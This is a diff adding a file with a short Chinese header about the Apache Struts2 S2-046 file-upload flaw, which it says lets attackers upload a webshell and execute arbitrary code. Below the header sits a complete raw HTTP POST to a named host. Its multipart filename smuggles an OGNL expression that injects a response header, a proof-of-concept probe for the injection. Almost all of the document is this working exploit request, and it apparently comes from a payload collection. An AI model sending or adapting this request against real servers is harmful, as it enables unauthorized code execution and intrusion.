@@ -1,0 +1,17 @@
+# Apache Struts2 S2-046文件上传漏洞
+# Apache Struts2 是一个开源的 Java Web 应用程序开发框架，旨在帮助开发人员构建灵活、可维护和可扩展的企业级Web应用程序。攻击者可利用该漏洞上传 Webshell，执行任意代码。
+POST /doUpload.action?acid=80015027&bid=hd_tag_m8mv247d HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv247d
+RM-PRO-Token: ef6cac45bb2734e39faa2a71453ff694
+RM-PRO-Time: 1742808367285
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
+
+------WebKitFormBoundaryXd004BVJN9pBYBL2
+Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
+Content-Type: text/plain
+
+
+foo
+------WebKitFormBoundaryXd004BVJN9pBYBL2--
